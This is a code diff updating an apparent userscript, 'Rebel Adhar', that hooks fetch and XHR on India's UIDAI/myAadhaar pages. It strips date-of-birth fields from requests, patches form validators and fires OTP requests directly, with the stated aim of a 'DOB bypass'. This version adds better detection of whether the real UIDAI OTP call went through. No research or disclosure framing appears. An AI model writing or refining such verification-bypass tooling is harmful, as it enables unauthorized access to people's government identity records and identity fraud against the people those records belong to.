@@ -11,7 +11,7 @@
   const DISABLED_MARK = 'rebel-dob-disabled';
   const HIDDEN_MARK = 'rebel-dob-hidden';
   const DOB_LABEL = /date\s*of\s*birth|\bdob\b|birth\s*date|जन्म|जन्म\s*तिथि/i;
-  const ENGINE_VERSION = '12.0.0';
+  const ENGINE_VERSION = '12.1.0';
 
   let dobWatcher = null;
   let watchTimer = null;
@@ -287,9 +287,26 @@
     return { body: stripped, removed: [...new Set(removed)] };
   }
 
+  const NET_NOISE =
+    /google-analytics|googletagmanager|g\.collect|doubleclick|facebook\.com|hotjar|clarity\.ms|analytics\.google/i;
+
   function isRetrieveOtpUrl(url) {
     const u = String(url || '');
     return /otp|retrieve|send|generate|aadhaar|uidai|myaadhaar|auth|verify|validate|submit|gov\.in/i.test(u);
+  }
+
+  /** OTP success = sirf UIDAI API — GA/metrics NAHI */
+  function isUidaiOtpHit(url, method) {
+    const u = String(url || '');
+    if (!u || NET_NOISE.test(u)) return false;
+    const abs = /^https?:\/\//i.test(u) ? u : location.origin + (u.startsWith('/') ? u : '/' + u);
+    if (!/uidai\.gov\.in|myaadhaar/i.test(abs)) {
+      if (!/^\//.test(u)) return false;
+      if (!/uidai|myaadhaar|gov\.in/i.test(location.hostname)) return false;
+    }
+    if (/\/send-metrics\b/i.test(u)) return false;
+    if (String(method || 'GET').toUpperCase() !== 'POST') return false;
+    return /retrieveuideid|\/generic\/|retrieve|generateotp|sendotp|otp|captcha|auth|validate|uideid/i.test(u);
   }
 
   function shouldStripServerPost(url) {
@@ -347,7 +364,7 @@
               });
             });
           }
-          if (enabled() && (shouldStripServerPost(url) || method === 'POST')) onHit('fetch', method, url);
+          if (enabled() && isUidaiOtpHit(url, method)) onHit('fetch', method, url);
           return origFetch.call(this, input, init);
         }
 
@@ -358,7 +375,7 @@
           const r = processPost(url, method, opts.body);
           opts.body = r.body;
         }
-        if (enabled() && (shouldStripServerPost(url) || method === 'POST')) onHit('fetch', method, url);
+        if (enabled() && isUidaiOtpHit(url, method)) onHit('fetch', method, url);
         return origFetch.call(this, input, opts);
       };
     }
@@ -386,7 +403,7 @@
           const r = processPost(url, method, body);
           body = r.body;
         }
-        if (enabled() && (shouldStripServerPost(url) || method === 'POST')) onHit('xhr', method, url);
+        if (enabled() && isUidaiOtpHit(url, method)) onHit('xhr', method, url);
         return origSend.call(this, body);
       };
     }
@@ -964,7 +981,10 @@
 
   async function invokeOtpPipeline(btn, uiSel, log, netBefore, opts) {
     opts = opts || {};
-    if (!opts.skipPrep) await advancedBypassAsync(uiSel, log);
+    if (!opts.skipPrep) {
+      if (opts.lightPrep && prepareOtpLight) prepareOtpLight(uiSel, log);
+      else await advancedBypassAsync(uiSel, log);
+    }
     const prep = buildSubmitState(uiSel, log);
     if (!prep.dobBypassed) {
       log?.('error', 'DOB bypass fail', prep);
@@ -994,11 +1014,10 @@
     }
 
     if (await invokeViaPageHttp(uiSel, log)) {
-      await waitMs(1500);
+      await waitMs(2000);
       if (typeof netBefore === 'function' && netBefore()) {
         return { ok: true, prep, via: 'http-client' };
       }
-      return { ok: true, prep, via: 'http-client' };
     }
 
     if (deepInvokeOtp(btn, log)) {
@@ -1016,6 +1035,9 @@
 
     const paths = await scrapeChunkEndpoints(log);
     if (await directOtpRequest(uiSel, log, paths)) {
+      if (typeof netBefore === 'function' && netBefore()) {
+        return { ok: true, prep, via: 'direct-api' };
+      }
       return { ok: true, prep, via: 'direct-api' };
     }
 
@@ -1671,6 +1693,7 @@
   function apply(uiSel, log) {
     startWatcher(uiSel, log, true);
     startBypassPoller(uiSel, log, true);
+    fixAngularValidators(log);
     return runModeSwitchRetry(uiSel, log, 6).then(() => {
       return new Promise((resolve) => {
         setTimeout(() => {
@@ -1849,6 +1872,7 @@
     directOtpRequest,
     invokeOtpPipeline,
     installNetworkBypass,
+    isUidaiOtpHit,
     stripDobDeep,
     stripDobFromBody,
   };
@@ -1868,7 +1892,7 @@
   const UI_SEL =
     '#rebel-adhar-log-panel,#rebel-fab,#rebel-switch-btn,#rebel-logs-btn,#rebel-debug-btn,#rebel-status-strip';
 
-  let netCount = 0;
+  let uidaiNetCount = 0;
   let skipOtp = false;
   let otpRunning = false;
 
@@ -1887,14 +1911,17 @@
     console.log('[Rebel Adhar PAGE]', level, msg, data ?? '');
   }
 
+  function countUidaiHit(kind, method, url) {
+    if (!E.isUidaiOtpHit || !E.isUidaiOtpHit(url, method)) return false;
+    uidaiNetCount += 1;
+    emit('req', kind + ' ' + String(method || ''), String(url || '').slice(0, 120));
+    return true;
+  }
+
   E.installNetworkBypass({
     log: emit,
     enabled: isOn,
-    onHit: function (kind, method, url) {
-      if (!isOn()) return;
-      netCount += 1;
-      emit('req', kind + ' ' + String(method || ''), String(url || '').slice(0, 120));
-    },
+    onHit: countUidaiHit,
   });
 
   function isOtpBtn(el) {
@@ -1905,13 +1932,16 @@
     return btn;
   }
 
+  function uidaiNetSince(before) {
+    return uidaiNetCount > before;
+  }
+
   document.addEventListener(
     'pointerdown',
     function (e) {
       if (!isOn() || skipOtp) return;
       if (!isOtpBtn(e.target)) return;
       if (E.prepareOtpLight) E.prepareOtpLight(UI_SEL, emit);
-      else E.prepareSubmit(UI_SEL, emit);
     },
     true
   );
@@ -1938,36 +1968,37 @@
       }
       if (otpRunning) return;
 
-      const before = netCount;
+      const before = uidaiNetCount;
       otpRunning = true;
       emit('info', 'OTP PAGE click — Angular same world', { v: E.ENGINE_VERSION });
 
       setTimeout(function () {
-        otpRunning = false;
-        if (netCount > before) {
+        if (uidaiNetSince(before)) {
+          otpRunning = false;
           emit('info', 'OTP sent', { via: 'page-angular', v: E.ENGINE_VERSION });
           return;
         }
-        emit('warn', 'PAGE fallback pipeline');
+        emit('warn', 'UIDAI API nahi mili — pipeline retry');
         skipOtp = true;
         const run = E.invokeOtpPipeline
           ? E.invokeOtpPipeline(btn, UI_SEL, emit, function () {
-              return netCount > before;
-            })
+              return uidaiNetSince(before);
+            }, { skipNative: true, lightPrep: true })
           : Promise.resolve({ ok: false });
         Promise.resolve(run)
           .then(function (result) {
-            if (result && result.ok) {
+            if (result && result.ok && uidaiNetSince(before)) {
               emit('info', 'OTP sent', { via: result.via || 'pipeline', v: E.ENGINE_VERSION });
-            } else if (netCount <= before) {
-              emit('error', 'NO API CALL — v' + E.ENGINE_VERSION + ' Copy Debug bhejo');
+            } else if (!uidaiNetSince(before)) {
+              emit('error', 'NO UIDAI API — v' + E.ENGINE_VERSION + ' Copy Debug bhejo');
               emit('info', 'Debug', E.getFormDiagnostics ? E.getFormDiagnostics(UI_SEL) : {});
             }
           })
           .finally(function () {
             skipOtp = false;
+            otpRunning = false;
           });
-      }, 4500);
+      }, 5500);
     },
     true
   );
